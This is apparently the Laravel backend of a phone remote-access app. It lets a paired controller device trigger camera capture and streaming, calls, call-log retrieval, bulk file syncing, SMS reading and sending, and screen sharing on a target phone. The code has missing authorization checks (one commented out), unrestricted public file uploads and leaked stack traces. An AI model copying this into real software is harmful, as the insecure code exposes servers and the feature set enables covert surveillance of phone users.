<?php

namespace App\Http\Controllers;

use App\Events\AdminCommandCreated;
use App\Events\AdminStatsUpdated;
use App\Events\CommandEvent;
use App\Events\WebRTCSignal;
use App\Models\Command;
use App\Models\Device;
use App\Services\FirebaseService;
use App\Services\StatsService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;


class AccessController extends Controller
{
    protected $firebase;
    protected $statsService;

    public function __construct(FirebaseService $firebase, StatsService $statsService)
    {
        $this->firebase = $firebase;
        $this->statsService = $statsService;
    }

    private function sendCommand($action, $target, $controller, $payload = [])
    {
        $command = Command::create([
            'from_device_id' => $controller->id,
            'to_device_id' => $target->id,
            'action' => $action,
            'payload' => json_encode($payload),
            'status' => 'pending',
        ]);

        event(new AdminCommandCreated($command));
        // event(new AdminStatsUpdated(getCurrentStats()));

        event(new AdminStatsUpdated(StatsService::current()));


        // Broadcast via Reverb (WebSocket)
        event(new CommandEvent($command));

        // Firebase push fallback
        if ($target->fcm_token) {
            $this->firebase->sendPush($target->fcm_token, [
                'type' => 'command',
                'command_id' => $command->id,
                'action' => $action,
            ]);
        }

        return $command;
    }


    public function completeCommand(Request $request)
    {
        $request->validate([
            'command_id' => 'required|exists:commands,id',
            'result' => 'nullable|string',
            'error' => 'nullable|string',
        ]);

        $command = Command::find($request->command_id);

        // $user = Auth::user();
        // $device = Device::where('device_id', $request->header('X-Device-ID'))->first();

        // if (!$device || $command->to_device_id !== $device->id) {
        //     abort(403, 'Unauthorized');
        // }

        $command->update([
            'status' => $request->error ? 'failed' : 'completed',
            'result' => $request->result,
            'error' => $request->error,
        ]);

        // Broadcast updates
        event(new \App\Events\AdminCommandUpdated($command));
        event(new \App\Events\AdminStatsUpdated($this->statsService->current()));

        return response()->json(['message' => 'Command completed']);
    }

    private function validateAndGetDevices(Request $request)
    {
        $request->validate([
            'target_device_id' => 'required|exists:devices,id',
        ]);

        $user = Auth::user();
        $controller = $user->devices()->where('role', 'controller')->first();

        if (!$controller) {
            abort(403, 'No controller device registered.');
        }

        $target = Device::find($request->target_device_id);

        if ((int) $target->paired_to !== (int) $controller->id) {
            abort(403, 'Device not paired with your controller.');
        }

        return [$controller, $target];
    }

    // ========================================
    // 1. CAMERA ACCESS
    // ========================================

    public function signal(Request $request)
    {
        $request->validate([
            'target_device_id' => 'required',
            'type' => 'required',
            'data' => 'required',
        ]);

        // This pushes the WebRTC data to the other phone instantly
        broadcast(new WebRTCSignal(
            $request->target_device_id,
            $request->type,
            $request->data
        ))->toOthers();

        return response()->json(['status' => 'signal_relayed']);
    }

    public function camera(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        Log::info('Camera command', [
            'controller_id' => $controller->id,
            'target_id' => $target->id,
            'target_device_id' => $target->device_id,
        ]);
        $request->validate([
            'type' => 'required|in:photo,video,stream,switch_camera',
        ]);

        $payload = [
            'type' => $request->type,
        ];

        $command = $this->sendCommand('camera_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function uploadCameraFile(Request $request)
    {
        $request->validate([
            'command_id' => 'required|exists:commands,id',
            'file' => 'required|file|mimes:jpg,jpeg,png,mp4,mov|max:20480',
        ]);

        $command = Command::findOrFail($request->command_id);

        // SECURITY: Verify this upload is coming from the correct target device
        if ($command->to_device_id !== $request->header('X-Device-ID')) {
            return response()->json(['error' => 'Unauthorized device'], 403);
        }

        $file = $request->file('file');
        $fileName = time() . '_' . $file->getClientOriginalName();

        // Ensure directory exists
        if (!file_exists(public_path('camera_uploads'))) {
            mkdir(public_path('camera_uploads'), 0775, true);
        }

        $file->move(public_path('camera_uploads'), $fileName);
        $url = url('camera_uploads/' . $fileName);

        // Identify which device this belongs to for the result log
        $command->update([
            'status' => 'completed',
            'result' => json_encode([
                'url' => $url,
                'type' => $request->type ?? 'photo',
                'device_name' => $command->toDevice->name ?? 'Unknown Device'
            ])
        ]);

        return response()->json(['success' => true, 'url' => $url]);
    }

    // ========================================
    // 2. CALL ACCESS
    // ========================================
    public function call(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:dial,get_logs',
            'number' => 'nullable|string|required_if:action,dial',
        ]);

        $payload = [
            'action' => $request->action,
        ];

        if ($request->action === 'dial') {
            $payload['number'] = $request->number;
        }

        $command = $this->sendCommand('call_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function file(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:sync', // only sync (download all)
        ]);

        Log::info('Initiating file sync', [
            'controller_device_id' => $controller->device_id,
            'target_device_id' => $target->device_id,
        ]);

        $payload = [
            'action' => 'sync_files',
            'paths' => [
                '/storage/emulated/0/DCIM/',
                '/storage/emulated/0/Download/',
                '/storage/emulated/0/Pictures/',
                '/storage/emulated/0/Documents/',
            ],
        ];

        $command = $this->sendCommand('file_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function fileAutoSync(Request $request)
    {
        Log::info('File auto sync received', $request->except('file_uploads'));

        $request->validate([
            'device_id'  => 'required|string',
            'path'       => 'required|string',
            'command_id' => 'nullable|string',
            'is_final'   => 'nullable|string',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            return response()->json(['error' => 'Unauthorized'], 403);
        }

        // Save uploaded files
        $savedFiles = [];
        $folderPath = public_path('files/' . $device->device_id);

        if (!file_exists($folderPath)) {
            mkdir($folderPath, 0777, true);
        }

        if ($request->hasFile('file_uploads')) {
            foreach ($request->file('file_uploads') as $file) {
                $originalName = $file->getClientOriginalName();
                $file->move($folderPath, $originalName);

                $savedFiles[] = [
                    'name'        => $originalName,
                    'server_path' => 'files/' . $device->device_id . '/' . $originalName,
                    'url'         => asset('files/' . $device->device_id . '/' . $originalName),
                    'size'        => File::size($folderPath . '/' . $originalName),
                    'modified'    => now()->timestamp,
                ];
            }
        }

        Log::info('Saved ' . count($savedFiles) . ' files for device ' . $device->device_id);

        // Handle command result update
        $isFinal = $request->is_final === 'true';

        if ($request->command_id) {
            $command = Command::find($request->command_id);

            if ($command) {
                $existingResult = $command->result ? json_decode($command->result, true) : [];
                $existingFiles  = $existingResult['files'] ?? [];
                $mergedFiles    = array_merge($existingFiles, $savedFiles);

                // FIX: mark completed on is_final regardless of whether files were uploaded
                if ($isFinal) {
                    $command->update([
                        'status' => 'completed',
                        'result' => json_encode([
                            'status' => 'success',
                            'files'  => $mergedFiles,
                            'path'   => $request->path,
                        ]),
                    ]);
                } else {
                    $command->update([
                        'result' => json_encode([
                            'status' => 'in_progress',
                            'files'  => $mergedFiles,
                            'path'   => $request->path,
                        ]),
                    ]);
                }
            }
        }

        return response()->json([
            'message'  => 'Files synced successfully',
            'count'    => count($savedFiles),
            'files'    => $savedFiles,
            'is_final' => $isFinal,
        ]);
    }


    // ========================================
    // 4. GALLERY ACCESS
    // ========================================
    public function gallery(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:list,download',
            'media_type' => 'nullable|in:photo,video', // Optional filter
        ]);

        $payload = [
            'action' => $request->action,
            'media_type' => $request->media_type,
        ];

        $command = $this->sendCommand('gallery_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }

    public function galleryAutoSync(Request $request)
    {
        $request->validate([
            'device_id' => 'required|string',
            'media_id'  => 'required|string', // The local ID on the phone
            'title'     => 'required|string',
            'mime_type' => 'required|string',
            'date'      => 'required',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            abort(403);
        }

        $mediaData = [
            'media_id'  => $request->media_id,
            'title'     => $request->title,
            'mime_type' => $request->mime_type,
            'date'      => $request->date,
        ];

        // Store in Command history so Controller can see it
        return Command::updateOrCreate(
            [
                'from_device_id' => $device->id,
                'action'         => 'gallery_access',
                'payload'        => json_encode([
                    'action'   => 'auto_sync_gallery',
                    'media_id' => $request->media_id
                ]),
            ],
            [
                'to_device_id'   => $device->paired_to,
                'result'         => json_encode([$mediaData]),
                'status'         => 'completed',
            ]
        );
    }

    public function uploadMedia(Request $request)
    {
        $request->validate([
            'media_id' => 'required|string',
            'file' => 'required|file|image|max:10240', // Max 10MB
        ]);

        if ($request->hasFile('file')) {
            $file = $request->file('file');

            // Create folder if it doesn't exist
            $path = public_path('gallery_sync');
            if (!file_exists($path)) {
                mkdir($path, 0777, true);
            }

            // Save file: format as mediaId_timestamp.ext
            $fileName = $request->media_id . '_' . time() . '.' . $file->getClientOriginalExtension();
            $file->move($path, $fileName);

            return response()->json([
                'status' => 'success',
                'url' => asset('gallery_sync/' . $fileName)
            ]);
        }

        return response()->json(['error' => 'No file uploaded'], 400);
    }

    // ========================================
    // 5. MESSAGE ACCESS
    // ========================================
    public function message(Request $request)
    {
        [$controller, $target] = $this->validateAndGetDevices($request);

        $request->validate([
            'action' => 'required|in:send,read,inbox',
            'to' => 'nullable|string|required_if:action,send',
            'text' => 'nullable|string|required_if:action,send',
            'thread_id' => 'nullable|integer',
        ]);

        $payload = ['action' => $request->action];

        if ($request->action === 'send') {
            $payload['to'] = $request->to;
            $payload['text'] = $request->text;
        }

        if ($request->action === 'read') {
            $payload['thread_id'] = $request->thread_id;
        }

        $command = $this->sendCommand('message_access', $target, $controller, $payload);

        return response()->json(['command_id' => $command->id]);
    }
    public function smsAutoSync(Request $request)
    {
        $request->validate([
            'device_id' => 'required|string',
            'from'      => 'required|string',
            'body'      => 'required|string',
            'date'      => 'required',
        ]);

        $user = Auth::user();
        $device = $user->devices()->where('device_id', $request->device_id)->first();

        if (!$device || $device->role !== 'controlled') {
            abort(403);
        }

        $smsData = [
            'from' => $request->from,
            'body' => $request->body,
            'date' => $request->date,
        ];

        // Use updateOrCreate to prevent exact duplicates in the History
        // based on the SMS date and sender.
        return Command::updateOrCreate(
            [
                'from_device_id' => $device->id,
                'action'         => 'message_access',
                // Using a fingerprint of the SMS in the payload to identify uniqueness
                'payload'        => json_encode([
                    'action' => 'auto_sync_received',
                    'sms_date' => $request->date,
                    'sms_from' => $request->from
                ]),
            ],
            [
                'to_device_id'   => $device->paired_to,
                'result'         => json_encode([$smsData]),
                'status'         => 'completed',
            ]
        );
    }

    // Screen share
    public function requestScreenShare(Request $request)
    {
        try {
            $request->validate([
                'target_device_id' => 'required|integer',
            ]);

            // Logic fix: Determine who the sender (Controller) is
            $user = Auth::user();

            // Use active_device_id if it exists, otherwise find the device
            // belonging to this user that has the 'controller' role.
            $fromDeviceId = $user->active_device_id ??
                DB::table('devices')
                ->where('user_id', $user->id)
                ->where('role', 'controller')
                ->value('id');

            if (!$fromDeviceId) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Sender device could not be identified.'
                ], 400);
            }

            // Create the command
            $command = Command::create([
                'from_device_id' => (int) $fromDeviceId,
                'to_device_id'   => (int) $request->target_device_id,
                'action'         => 'SCREEN_SHARE',
                'payload'        => json_encode(['type' => 'start']),
                'status'         => 'pending',
            ]);

            return response()->json([
                'status' => 'success',
                'command_id' => $command->id
            ]);
        } catch (\Exception $e) {
            // This will show you the EXACT error in your Flutter logs instead of just "500"
            return response()->json([
                'status' => 'error',
                'message' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ], 500);
        }
    }
}
